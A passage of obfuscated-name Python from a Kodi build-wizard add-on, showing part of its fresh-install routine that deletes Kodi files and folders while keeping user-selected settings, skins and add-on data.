			EXCLUDES .append ('plugin.video.anonymous.wall')#line:5279
		if KEEPADDONS =='true':#line:5280
			EXCLUDES .append ('addons')#line:5281
		if KEEPTELEMEDIA =='true':#line:5282
			EXCLUDES .append ('plugin.video.telemedia')#line:5283
		EXCLUDES .append ('plugin.video.elementum')#line:5288
		EXCLUDES .append ('script.elementum.burst')#line:5289
		EXCLUDES .append ('script.elementum.burst-master')#line:5290
		EXCLUDES .append ('plugin.video.quasar')#line:5291
		EXCLUDES .append ('script.quasar.burst')#line:5292
		EXCLUDES .append ('skin.estuary')#line:5293
		if KEEPWHITELIST =='true':#line:5296
			OOO000OO000OO000O =''#line:5297
			O000OO0O00000OOOO =wiz .whiteList ('read')#line:5298
			if len (O000OO0O00000OOOO )>0 :#line:5299
				for OO0OOO00O00O00OO0 in O000OO0O00000OOOO :#line:5300
					try :OOOOO0O00O0000OO0 ,O00O00OOOO00OO0O0 ,OOO00000OO0O0O0OO =OO0OOO00O00O00OO0 #line:5301
					except :pass #line:5302
					if OOO00000OO0O0O0OO .startswith ('pvr'):OOO000OO000OO000O =O00O00OOOO00OO0O0 #line:5303
					OO000O0OO0OOOO0O0 =dependsList (OOO00000OO0O0O0OO )#line:5304
					for O000O00OOOOO00OO0 in OO000O0OO0OOOO0O0 :#line:5305
						if not O000O00OOOOO00OO0 in EXCLUDES :#line:5306
							EXCLUDES .append (O000O00OOOOO00OO0 )#line:5307
						OO0OOOO0O00OO000O =dependsList (O000O00OOOOO00OO0 )#line:5308
						for O00O0O00O0O00O0OO in OO0OOOO0O00OO000O :#line:5309
							if not O00O0O00O0O00O0OO in EXCLUDES :#line:5310
								EXCLUDES .append (O00O0O00O0O00O0OO )#line:5311
					if not OOO00000OO0O0O0OO in EXCLUDES :#line:5312
						EXCLUDES .append (OOO00000OO0O0O0OO )#line:5313
				if not OOO000OO000OO000O =='':wiz .setS ('pvrclient',OOO00000OO0O0O0OO )#line:5314
		if wiz .getS ('pvrclient')=='':#line:5315
			for OO0OOO00O00O00OO0 in EXCLUDES :#line:5316
				if OO0OOO00O00O00OO0 .startswith ('pvr'):#line:5317
					wiz .setS ('pvrclient',OO0OOO00O00O00OO0 )#line:5318
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:5319
		OOOO0O0OO0O000OO0 =wiz .latestDB ('Addons')#line:5320
		for OOO00O000O0O00OO0 ,O0O00OO0OOOOO0O00 ,O0OO0OO00O0O00OOO in os .walk (OO0000000O000000O ,topdown =True ):#line:5321
			O0O00OO0OOOOO0O00 [:]=[OO0000OOOOO000O0O for OO0000OOOOO000O0O in O0O00OO0OOOOO0O00 if OO0000OOOOO000O0O not in EXCLUDES ]#line:5322
			for OOOOO0O00O0000OO0 in O0OO0OO00O0O00OOO :#line:5323
				OOOOO0O0000O00000 +=1 #line:5324
				OOO00000OO0O0O0OO =OOO00O000O0O00OO0 .replace ('/','\\').split ('\\')#line:5325
				O0O0O00OOOOO0000O =len (OOO00000OO0O0O0OO )-1 #line:5327
				if OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -2 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='addon_data'and 'script.skinshortcuts'in OOO00000OO0O0O0OO [O0O0O00OOOOO0000O ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5328
				elif OOOOO0O00O0000OO0 =='MyVideos99.db'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5329
				elif OOOOO0O00O0000OO0 =='MyVideos107.db'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5330
				elif OOOOO0O00O0000OO0 =='MyVideos116.db'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5331
				elif OOOOO0O00O0000OO0 =='MyVideos99.db'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5332
				elif OOOOO0O00O0000OO0 =='MyVideos107.db'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5333
				elif OOOOO0O00O0000OO0 =='MyVideos116.db'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5334
				elif OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -2 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in OOO00000OO0O0O0OO [O0O0O00OOOOO0000O ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5335
				elif OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -2 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='addon_data'and 'skin.anonymous.mod'in OOO00000OO0O0O0OO [O0O0O00OOOOO0000O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5336
				elif OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -2 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='addon_data'and 'skin.Premium.mod'in OOO00000OO0O0O0OO [O0O0O00OOOOO0000O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5337
				elif OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -2 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='addon_data'and 'skin.anonymous.nox'in OOO00000OO0O0O0OO [O0O0O00OOOOO0000O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5338
				elif OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -2 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='addon_data'and 'skin.phenomenal'in OOO00000OO0O0O0OO [O0O0O00OOOOO0000O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5339
				elif OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -2 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='addon_data'and 'plugin.video.metalliq'in OOO00000OO0O0O0OO [O0O0O00OOOOO0000O ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5340
				elif OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -2 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='addon_data'and 'skin.titan'in OOO00000OO0O0O0OO [O0O0O00OOOOO0000O ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5342
				elif OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -2 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='addon_data'and 'pvr.iptvsimple'in OOO00000OO0O0O0OO [O0O0O00OOOOO0000O ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5343
				elif OOOOO0O00O0000OO0 =='sources.xml'and OOO00000OO0O0O0OO [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5345
				elif OOOOO0O00O0000OO0 =='quicknav.DATA.xml'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -2 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='addon_data'and 'script.skinshortcuts'in OOO00000OO0O0O0OO [O0O0O00OOOOO0000O ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5348
				elif OOOOO0O00O0000OO0 =='x1101.DATA.xml'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -2 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='addon_data'and 'script.skinshortcuts'in OOO00000OO0O0O0OO [O0O0O00OOOOO0000O ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5349
				elif OOOOO0O00O0000OO0 =='b-srtym-b.DATA.xml'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -2 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='addon_data'and 'script.skinshortcuts'in OOO00000OO0O0O0OO [O0O0O00OOOOO0000O ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5350
				elif OOOOO0O00O0000OO0 =='x1102.DATA.xml'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -2 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='addon_data'and 'script.skinshortcuts'in OOO00000OO0O0O0OO [O0O0O00OOOOO0000O ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5351
				elif OOOOO0O00O0000OO0 =='b-sdrvt-b.DATA.xml'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -2 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='addon_data'and 'script.skinshortcuts'in OOO00000OO0O0O0OO [O0O0O00OOOOO0000O ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5352
				elif OOOOO0O00O0000OO0 =='x1112.DATA.xml'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -2 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='addon_data'and 'script.skinshortcuts'in OOO00000OO0O0O0OO [O0O0O00OOOOO0000O ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5353
				elif OOOOO0O00O0000OO0 =='b-tlvvyzyh-b.DATA.xml'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -2 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='addon_data'and 'script.skinshortcuts'in OOO00000OO0O0O0OO [O0O0O00OOOOO0000O ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5354
				elif OOOOO0O00O0000OO0 =='x1111.DATA.xml'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -2 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='addon_data'and 'script.skinshortcuts'in OOO00000OO0O0O0OO [O0O0O00OOOOO0000O ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5355
				elif OOOOO0O00O0000OO0 =='b-tvknyshrly-b.DATA.xml'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -2 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='addon_data'and 'script.skinshortcuts'in OOO00000OO0O0O0OO [O0O0O00OOOOO0000O ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5356
				elif OOOOO0O00O0000OO0 =='x1110.DATA.xml'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -2 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='addon_data'and 'script.skinshortcuts'in OOO00000OO0O0O0OO [O0O0O00OOOOO0000O ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5357
				elif OOOOO0O00O0000OO0 =='b-yldym-b.DATA.xml'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -2 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='addon_data'and 'script.skinshortcuts'in OOO00000OO0O0O0OO [O0O0O00OOOOO0000O ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5358
				elif OOOOO0O00O0000OO0 =='x1114.DATA.xml'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -2 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='addon_data'and 'script.skinshortcuts'in OOO00000OO0O0O0OO [O0O0O00OOOOO0000O ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5359
				elif OOOOO0O00O0000OO0 =='b-mvzyqh-b.DATA.xml'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -2 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='addon_data'and 'script.skinshortcuts'in OOO00000OO0O0O0OO [O0O0O00OOOOO0000O ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5360
				elif OOOOO0O00O0000OO0 =='mainmenu.DATA.xml'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -2 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='addon_data'and 'script.skinshortcuts'in OOO00000OO0O0O0OO [O0O0O00OOOOO0000O ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5361
				elif OOOOO0O00O0000OO0 =='skin.Premium.mod.properties'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -2 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='addon_data'and 'script.skinshortcuts'in OOO00000OO0O0O0OO [O0O0O00OOOOO0000O ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5362
				elif OOOOO0O00O0000OO0 =='x1122.DATA.xml'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -2 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='addon_data'and 'script.skinshortcuts'in OOO00000OO0O0O0OO [O0O0O00OOOOO0000O ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5364
				elif OOOOO0O00O0000OO0 =='b-spvrt-b.DATA.xml'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -2 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='addon_data'and 'script.skinshortcuts'in OOO00000OO0O0O0OO [O0O0O00OOOOO0000O ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5365
				elif OOOOO0O00O0000OO0 =='favourites.xml'and OOO00000OO0O0O0OO [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5370
				elif OOOOO0O00O0000OO0 =='guisettings.xml'and OOO00000OO0O0O0OO [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5372
				elif OOOOO0O00O0000OO0 =='profiles.xml'and OOO00000OO0O0O0OO [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5373
				elif OOOOO0O00O0000OO0 =='advancedsettings.xml'and OOO00000OO0O0O0OO [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5374
				elif OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -2 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in OOO00000OO0O0O0OO [O0O0O00OOOOO0000O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5375
				elif OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -2 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='addon_data'and 'program.apollo'in OOO00000OO0O0O0OO [O0O0O00OOOOO0000O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5376
				elif OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -2 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='addon_data'and 'plugin.video.allmoviesin'in OOO00000OO0O0O0OO [O0O0O00OOOOO0000O ]and KEEPVICTORY =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5377
				elif OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -2 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='addon_data'and 'plugin.video.telemedia'in OOO00000OO0O0O0OO [O0O0O00OOOOO0000O ]and KEEPTELEMEDIA =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5378
				elif OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -2 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='addon_data'and 'plugin.video.elementum'in OOO00000OO0O0O0OO [O0O0O00OOOOO0000O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5381
				elif OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -2 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='addon_data'and 'plugin.audio.soundcloud'in OOO00000OO0O0O0OO [O0O0O00OOOOO0000O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5383
				elif OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -2 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='addon_data'and 'weather.yahoo'in OOO00000OO0O0O0OO [O0O0O00OOOOO0000O ]and KEEPWEATHER =='true':wiz .log ("Keep weather: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5384
				elif OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -2 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='addon_data'and 'plugin.video.quasar'in OOO00000OO0O0O0OO [O0O0O00OOOOO0000O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5385
				elif OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -2 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='addon_data'and 'program.apollo'in OOO00000OO0O0O0OO [O0O0O00OOOOO0000O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5386
				elif OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -2 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in OOO00000OO0O0O0OO [O0O0O00OOOOO0000O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5387
				elif OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -2 ]=='userdata'and OOO00000OO0O0O0OO [O0O0O00OOOOO0000O -1 ]=='addon_data'and 'plugin.video.playlistLoader'in OOO00000OO0O0O0OO [O0O0O00OOOOO0000O ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5388
				elif OOOOO0O00O0000OO0 in LOGFILES :wiz .log ("Keep Log File: %s"%OOOOO0O00O0000OO0 ,xbmc .LOGNOTICE )#line:5389
				elif OOOOO0O00O0000OO0 .endswith ('.db'):#line:5390
					try :#line:5391
						if OOOOO0O00O0000OO0 ==OOOO0O0OO0O000OO0 and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(OOOOO0O00O0000OO0 ,KODIV ),xbmc .LOGNOTICE )#line:5392
						else :os .remove (os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ))#line:5393
					except Exception as O0O0OOO0OOO000O00 :#line:5394
						if not OOOOO0O00O0000OO0 .startswith ('Textures13'):#line:5395
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:5396
							wiz .log ("-> %s"%(str (O0O0OOO0OOO000O00 )),xbmc .LOGNOTICE )#line:5397
							wiz .purgeDb (os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ))#line:5398
				else :#line:5399
					DP .update (int (wiz .percentage (OOOOO0O0000O00000 ,OO0O000OOO00O0OO0 )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOO0O00O0000OO0 ),'')#line:5400
					try :os .remove (os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ))#line:5401
					except Exception as O0O0OOO0OOO000O00 :#line:5402
						wiz .log ("Error removing %s"%os .path .join (OOO00O000O0O00OO0 ,OOOOO0O00O0000OO0 ),xbmc .LOGNOTICE )#line:5403
						wiz .log ("-> / %s"%(str (O0O0OOO0OOO000O00 )),xbmc .LOGNOTICE )#line:5404
			if DP .iscanceled ():#line:5405
				DP .close ()#line:5406
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5407
				return False #line:5408
		for OOO00O000O0O00OO0 ,O0O00OO0OOOOO0O00 ,O0OO0OO00O0O00OOO in os .walk (OO0000000O000000O ,topdown =True ):#line:5409
			O0O00OO0OOOOO0O00 [:]=[OOO000OO00O00000O for OOO000OO00O00000O in O0O00OO0OOOOO0O00 if OOO000OO00O00000O not in EXCLUDES ]#line:5410
			for OOOOO0O00O0000OO0 in O0O00OO0OOOOO0O00 :#line:5411
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OOOOO0O00O0000OO0 ),'')#line:5412
			  if OOOOO0O00O0000OO0 not in ["Database","userdata","temp","addons","addon_data"]:#line:5413
			   if not (OOOOO0O00O0000OO0 =='script.skinshortcuts'and KEEPSKIN =='true'):#line:5414
			    if not (OOOOO0O00O0000OO0 =='skin.titan'and KEEPSKIN3 =='true'):#line:5416
			      if not (OOOOO0O00O0000OO0 =='pvr.iptvsimple'and KEEPPVR =='true'):#line:5417
			       if not (OOOOO0O00O0000OO0 =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:5418
			        if not (OOOOO0O00O0000OO0 =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:5419
			         if not (OOOOO0O00O0000OO0 =='program.apollo'and KEEPINFO =='true'):#line:5420
			          if not (OOOOO0O00O0000OO0 =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:5421
			           if not (OOOOO0O00O0000OO0 =='weather.yahoo'and KEEPWEATHER =='true'):#line:5422
			            if not (OOOOO0O00O0000OO0 =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:5423
			             if not (OOOOO0O00O0000OO0 =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:5424
			              if not (OOOOO0O00O0000OO0 =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:5425
			               if not (OOOOO0O00O0000OO0 =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:5426
			                if not (OOOOO0O00O0000OO0 =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:5427
			                 if not (OOOOO0O00O0000OO0 =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:5428
			                  if not (OOOOO0O00O0000OO0 =='plugin.video.neptune'and KEEPINFO =='true'):#line:5429
			                   if not (OOOOO0O00O0000OO0 =='plugin.video.youtube'and KEEPINFO =='true'):#line:5430
			                    if not (OOOOO0O00O0000OO0 =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:5431
			                     if not (OOOOO0O00O0000OO0 =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:5432
			                      if not (OOOOO0O00O0000OO0 =='plugin.video.allmoviesin'and KEEPVICTORY =='true'):#line:5433
			                       if not (OOOOO0O00O0000OO0 =='plugin.video.telemedia'and KEEPTELEMEDIA =='true'):#line:5434
			                           if not (OOOOO0O00O0000OO0 =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:5438
			                            if not (OOOOO0O00O0000OO0 =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:5439
			                             if not (OOOOO0O00O0000OO0 =='plugin.video.torrenter'and KEEPINFO =='true'):#line:5440
			                              if not (OOOOO0O00O0000OO0 =='plugin.video.quasar'and KEEPINFO =='true'):#line:5441
			                               if not (OOOOO0O00O0000OO0 =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:5442
